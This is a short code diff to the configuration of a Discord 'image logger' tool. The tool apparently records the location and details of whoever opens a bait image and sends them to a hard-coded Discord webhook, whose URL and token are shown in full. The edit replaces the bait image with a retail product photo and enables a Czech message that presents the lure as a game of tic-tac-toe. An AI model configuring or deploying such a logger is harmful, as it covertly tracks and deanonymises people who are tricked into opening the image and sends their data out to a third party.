@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1109544641629520014/sbIch0DGA35aNFQp4auzTwZUs1aqx8O1ch0fvimnbUDEB_D63CrAU8QKnbWfkBeoRdPZ",
-    "image": "https://as2.ftcdn.net/v2/jpg/00/60/40/01/1000_F_60400194_lS1hnqXYnUHcvFheoWHu1bI6TaUZw97Y.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://static.zarahome.net/8/photos4/2022/I/4/1/p/3518/043/999/3518043999_1_1_3.jpg?t=1657192839714", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Piškvorky: Hra začala", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
